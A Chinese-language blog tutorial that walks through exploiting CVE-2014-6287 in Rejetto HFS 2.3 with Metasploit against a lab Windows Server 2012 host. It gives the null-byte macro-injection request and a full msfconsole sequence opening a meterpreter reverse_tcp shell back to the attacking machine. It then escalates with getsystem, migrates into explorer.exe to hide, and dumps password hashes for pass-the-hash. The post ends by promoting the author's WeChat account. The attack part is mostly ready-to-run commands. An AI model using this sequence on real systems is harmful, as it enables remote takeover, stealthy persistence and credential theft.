---
layout: post
category: binghe-code-hack
title: Metasploit攻击HFS2.3上的漏洞
tagline: by 冰河
tag: [hack,binghe-code-hack]
excerpt: Metasploit攻击HFS2.3上的漏洞
lock: need
---

# Metasploit攻击HFS2.3上的漏洞

攻击机： kali 192.168.109.137

靶机： windows server 2012 192.168.109.141

工具：Metasploit

根据CVE-2014-6287的描述，Rejetto网络文件服务器(也被称为HSF或者HttpFileServer)的2.3x版本(2.3c以前的版本)中的parserLib.pas文件使用了一个findMacroMaker函数，该漏洞源于parserLib.pas文件没有正确处理空字节。远程攻击者可借助搜索操作中的%00序列利用该漏洞执行任意程序。

下面给出了这个有漏洞的函数：

```
function findMacroMarker(s:string; ofs:integer=1):integer;
begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;
```

这个函数不能正确的处理空字节，所以当我们对[http://localhost:80/search=%00](http://localhost:80/search=){.exec|cmd.}发起请求时，就会停止对宏的正则解析，从而导致远程代码的注入。

## 开启MSF

```
msfconsole
```

## 渗透漏洞

```
search hfs
use exploit/windows/http/rejetto_hfs_exec
show options
set RHOST 192.168.109.141
set RPORT 8080
show payloads
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.109.137
set LPORT 4444
show options
exploit
```

此时，我们已经以管理员的身份获得了Windows server 2012系统的权限。

## 将权限提升为系统级

```
getsystem
```

## 查看系统进程和Meterpreter正在驻留的进程号

```
ps
getpid
```

## 绑定Meterpreter到其他进程

这里，为了保险起见，我们将Meterpreter的进程绑定到explorer.exe的进程号，这里，explorer.exe的进程号为1864,执行如下命令：

```
migrate 1864
```

此时，我们再次输入getpid命令查看，Meterpreter正在驻留的进程号变成了1864

## 收集系统密码的哈希值

```
hashdump
```

完成了哈希值的收集之后，就可以执行pass-the-hash攻击，在没有明文密码的情况下绕过限制。


## 写在最后

> 如果你觉得冰河写的还不错，请微信搜索并关注「 **冰河技术** 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 **冰河技术** 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 **冰河技术** 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 **冰河技术** 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！


![](https://img-blog.csdnimg.cn/20200906013715889.png)